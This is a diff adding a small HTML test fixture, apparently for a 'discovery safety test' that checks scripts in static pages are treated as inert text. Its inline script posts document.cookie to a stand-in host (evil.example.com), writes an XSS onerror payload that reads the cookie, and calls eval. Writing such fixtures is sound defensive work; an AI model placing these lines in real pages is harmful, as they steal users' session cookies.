@@ -1,0 +1,14 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Malicious Inline Script</title></head>
+<body>
+  <h1>Static page</h1>
+  <script>
+    // Deliberately dangerous-looking inline script for the discovery
+    // safety test - this must be treated as inert text, never executed.
+    fetch("http://evil.example.com/exfiltrate", { method: "POST", body: document.cookie });
+    document.write("<img src=x onerror=alert(document.cookie)>");
+    eval("malicious-looking-code");
+  </script>
+</body>
+</html>
